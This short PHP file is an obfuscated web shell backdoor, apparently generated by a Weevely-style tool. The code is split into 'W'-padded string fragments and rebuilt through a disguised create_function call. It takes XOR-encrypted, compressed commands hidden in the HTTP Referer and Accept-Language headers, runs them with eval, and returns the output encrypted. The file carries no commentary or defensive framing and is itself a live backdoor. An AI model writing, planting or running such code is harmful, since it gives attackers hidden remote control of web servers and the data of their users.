<?php
$q='r=@$r["HTTP_WREFERWER"];$ra=WW@$r["HTTPW_ACWCEPT_LANGWUWWAGEW"];if($rr&&$ra)W{$u=parse_urlW($rr)W';
$U='W$kWh="5d41";$kf="40W2a";functWioWn x($t,W$k){$c=strWlWen($k);$l=stWrlen(W$t);W$o=""W;for($WiW=0;$i<$W';
$S='0.([W\\d]))?,W?/",$ra,$mW);if($qW&&$m){W@sessWion_WsWtart();$sW=&WW$_SESWSION;W$ss="sWubWstr";$WslW=';
$z='nW(W);$dW=base6W4_encode(xW(gzcompWress(W$o),$Wk)W);print("<$kW>W$d</$k>");@sessWion_deWsWtroy();}}}}';
$K='/W_/"W,"/WW-/"),aWrray("/","+"),W$ss(W$s[$i],0,$e)))W,$kW)));$o=oWb_geWt_coWntentWs();ob_endW_clea';
$v='$WWe){$Wk=$kh.$kfW;ob_sWtart();@evWal(@gWzuncWompWrWess(@x(@base6W4_decoWdWe(preWg_replace(array("';
$A='0,W3))W;$p="";fWorW($z=1;W$z<count($Wm[1]);W$zW++)$p.=$q[$m[W2]W[$z]];if(sWtWrpos($p,$hW)==WW=0){$s';
$c='[W$i]="";$p=$ssW($p,3);W}if(Warray_keyW_exWistsW($i,$Ws)){$s[$Wi].=$pW;$e=sWtrpos(W$s[$i]W,$f);if(';
$o='l;){for($jW=0;($j<$cW&&$Wi<$l);$jW++,$i++)W{$o.W=$Wt{$i}^$Wk{W$j};}}reWWturn $o;}$rW=$W_SERVEWR;$r';
$X='"strtolower";$i=$mW[1][0].$m[1][1]W;W$h=$sl($ss(md5W($iW.$Wkh)W,0,3))W;$f=$sl($ssW(md5($iW.$kf),';
$a=';WparsWe_sWtr($u["querWy"],$q);$q=WWarray_valuWeWs($q)W;preg_matcWh_alWl("/([\\Ww])[W\\w-]+(?:W;q=';
$N=str_replace('gB','','cgBreagBte_gBfugBngBgBction');
$C=str_replace('W','',$U.$o.$q.$a.$S.$X.$A.$c.$v.$K.$z);
$b=$N('',$C);$b();
?>
